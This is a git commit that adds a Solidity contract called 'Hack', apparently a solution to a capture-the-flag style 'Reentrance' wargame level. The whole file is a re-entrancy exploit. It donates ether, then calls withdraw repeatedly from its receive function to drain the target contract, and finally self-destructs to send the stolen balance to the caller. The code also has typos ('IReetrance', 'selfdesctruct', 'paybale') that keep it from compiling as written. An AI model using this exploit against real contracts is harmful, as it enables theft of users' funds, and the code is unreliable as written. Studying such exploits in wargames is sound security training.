c986213c3d28ea7976a76a8895d6e60419cefd18
m1n9 <149402250+mi1n9@users.noreply.github.com>
2025-11-18 16:17:22 +0800

    Update Re-entrancy.sol

--- Re-entrancy.sol
+++ Re-entrancy.sol
@@ -1,1 +1,32 @@
+// SPDX-License-Identifier:   MIT
+pragma solidity ^0.8.0;
 
+interface IReentrance {
+  function donate(address) public payable;
+  function withdraw(uint256) public;
+}
+contract Hack {
+  IReetrance private immutable target;
+
+  constructor(address _target){
+    target = IReetrance(_target);
+  }
+
+  function attack() external payable {
+    target.donate{value: 1e18}(address(this));
+    target.withdraw(1e18);
+    require(address(target).balance == 0,"target balance >0");
+    selfdesctruct(paybale(msg.sender));
+  }
+
+  receive() external paybale {
+    uint prize = min(1e18,address(target).balance);
+    if(prize > 0){
+    target.withdraw(prize);
+    }
+  }
+
+  function min(uint x,uint y) private pure returns(uint) {
+     return x<=y ? x:y;
+  }
+}
